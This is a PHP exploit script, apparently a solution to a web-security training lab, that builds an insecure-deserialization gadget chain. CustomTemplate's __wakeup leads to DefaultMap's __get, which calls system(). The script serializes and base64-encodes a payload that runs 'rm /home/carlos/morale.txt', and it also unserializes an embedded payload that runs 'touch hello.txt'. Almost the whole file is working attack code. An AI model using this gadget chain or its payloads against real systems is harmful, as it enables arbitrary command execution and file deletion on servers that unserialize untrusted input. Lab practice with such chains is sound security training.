<?php

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}


class CustomTemplate {
    public $default_desc_type;
    public $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    # automatically called during serialize
    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    # method automatically called during unserialize
    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    # called during accessing private or protected fields.
    public function __get($name) {
        // dynamically call a func with args.
        return call_user_func($this->callback, $name);
    }
}

class User {
    public $username;
    public $access_token;

    public function __construct($username, $access_token){
        $this->username = $username;
        $this->access_token = $access_token;
    }
}

$defaultMap = new DefaultMap("system");
// $product = new Product("rm /home/carlos/morale.txt",$defaultMap);

$custom_template = new CustomTemplate();
$custom_template->desc = $defaultMap;
$custom_template->default_desc_type = "rm /home/carlos/morale.txt";

$user1 = new User("wiener", $custom_template);

$payload = base64_encode(serialize($user1));

echo serialize($user1);
echo "\n";
echo $payload ;
echo "\n\n";

$exploit_payload = "TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTc6ImRlZmF1bHRfZGVzY190eXBlIjtzOjE1OiJ0b3VjaCBoZWxsby50eHQiO3M6NDoiZGVzYyI7TzoxMDoiRGVmYXVsdE1hcCI6MTp7czoyMDoiAERlZmF1bHRNYXAAY2FsbGJhY2siO3M6Njoic3lzdGVtIjt9fQ==";
unserialize(base64_decode($exploit_payload));

?>